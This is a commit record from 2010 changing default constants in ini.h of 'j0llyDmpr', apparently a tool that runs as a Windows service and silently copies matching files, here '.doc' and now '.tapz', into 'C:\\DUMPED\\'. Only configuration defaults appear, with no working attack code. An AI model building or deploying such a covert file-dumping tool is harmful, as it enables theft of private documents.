394e0f095eadde411eebdab536b584773f86f513
axelscht <axelscht@73d15a55-3cbc-9790-9833-9a9cf5108c0f>
2010-11-14 12:48:23 +0000

    * Update default main_configuration.patterns value. * Update config.ini.sample.

--- ini.h
+++ ini.h
@@ -27,7 +27,7 @@
 #define DEFAULT_SERVICE_DESC "j0llyDmpr by 0vercl0k (0vercl0k.tuxfamily.org)."
 #define DEFAULT_CONFIG_FILE "./config.ini"
 #define DEFAULT_OUTPUT_DIR "C:\\DUMPED\\"
-#define DEFAULT_PATTERN ".doc"
+#define DEFAULT_PATTERN ".doc;.tapz"
 #define DEFAULT_FILE_MAX_SIZE 1000U
 #define DEFAULT_RECURSE_MAX_LEVEL 10U
 
